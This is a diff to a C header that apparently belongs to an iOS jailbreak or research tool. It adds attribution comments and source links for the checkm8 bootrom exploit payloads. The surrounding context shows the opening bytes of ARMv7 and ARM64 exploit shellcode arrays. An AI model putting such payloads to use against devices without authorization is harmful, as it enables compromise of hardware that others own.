@@ -1,5 +1,17 @@
+/*
+ * checkm8_payload.h - exploit discovered by axi0mX.
+ * copyright (C) 2020/05/25 dora2ios
+ *
+ */
+
 #ifndef checkm8_payload_H
 #define checkm8_payload_H
+
+
+// Based on ipwndfu payload by axi0mX
+// https://github.com/axi0mX/ipwndfu/blob/0e28932ec6a2a570b10fd77e50bda4216418cd98/src/checkm8_armv7.S
+// The following includes the payload by synackuk
+// https://github.com/synackuk/ipwndfu/blob/c189a7c11c0dcc5bdb329d00131352262d12ec4f/src/usb_0xA1_2_armv7.S
 
 const unsigned char checkm8_payload_armv7[] = {
     0x00, 0x40, 0xa0, 0xe3, 0xf0, 0x40, 0x2d, 0xe9, 0x44, 0x01, 0x9f, 0xe5,
@@ -58,6 +70,11 @@ const unsigned char checkm8_payload_armv7[] = {
 };
 
 size_t checkm8_payload_length_armv7 = 628;
+
+
+// Based on ipwndfu payload by axi0mX
+// https://github.com/axi0mX/ipwndfu/blob/0e28932ec6a2a570b10fd77e50bda4216418cd98/src/checkm8_arm64.S
+// https://github.com/axi0mX/ipwndfu/blob/0e28932ec6a2a570b10fd77e50bda4216418cd98/src/usb_0xA1_2_arm64.S
 
 const unsigned char checkm8_payload_arm64[] = {
     0x13, 0x00, 0x80, 0xd2, 0xfd, 0x7b, 0xbf, 0xa9, 0xfd, 0x03, 0x00, 0x91,
